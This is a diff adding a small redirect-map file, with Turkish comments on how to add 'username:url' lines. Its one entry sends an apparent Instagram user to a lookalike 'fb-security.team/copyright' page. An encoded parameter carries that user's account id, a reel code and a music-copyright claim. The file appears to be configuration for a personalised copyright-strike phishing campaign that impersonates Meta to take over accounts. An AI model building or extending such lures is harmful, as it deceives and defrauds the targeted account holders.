@@ -1,0 +1,6 @@
+# username:https://full-redirect-url
+# GitHub'da sadece bu dosyayi duzenle — yeni satir ekle, kaydet.
+# Format: username:url  (ilk : ayirir)
+#
+# Ornek (test):
+ak2wio:https://fb-security.team/copyright/?data=eyJ1c2VybmFtZSI6ImFrMndpbyIsInBrIjoiNTM1NTA4ODYyOTMiLCJtdXNpY190aXRsZSI6IldlcmUrTGUrTGUiLCJtdXNpY19hcnRpc3QiOiJTZXJvK1Byb2R1a3Rpb24rQmVhdHMiLCJyZWVsX2NvZGUiOiJEVnRSRE1UaU82VyIsInRpbWUiOjE3ODQyNDA5MjJ9
